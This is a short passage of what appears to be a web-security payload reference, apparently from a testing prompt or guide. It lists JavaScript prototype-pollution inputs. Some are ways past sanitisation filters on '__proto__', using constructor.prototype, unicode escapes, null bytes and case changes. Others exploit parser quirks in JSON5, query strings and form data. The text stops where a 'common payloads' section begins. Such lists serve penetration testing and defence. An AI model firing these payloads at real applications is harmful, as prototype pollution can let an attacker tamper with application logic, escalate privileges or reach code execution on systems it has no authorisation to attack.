<bypass_techniques>
<sanitization_bypass>
{% raw %}
# If __proto__ is filtered
{"constructor": {"prototype": {"polluted": true}}}

# Unicode bypass
{"\u005f\u005fproto\u005f\u005f": {"polluted": true}}
{"__proto\u005f_": {"polluted": true}}

# Alternative property paths
{"['__proto__']": {"polluted": true}}
{"__proto__\u0000": {"polluted": true}}

# Case variation (rare)
{"__PROTO__": {"polluted": true}}
{% endraw %}
</sanitization_bypass>

<parser_quirks>
{% raw %}
# JSON5 or relaxed JSON parsers
{__proto__: {polluted: true}}  // Without quotes

# Query string parsers (qs, querystring)
?__proto__.polluted=true
?__proto__[polluted]=true
?constructor.prototype.polluted=true

# Form data parsers
Content-Type: application/x-www-form-urlencoded
__proto__[polluted]=true&constructor[prototype][polluted]=true
{% endraw %}
</parser_quirks>
</bypass_techniques>

<common_payloads>
{% raw %}
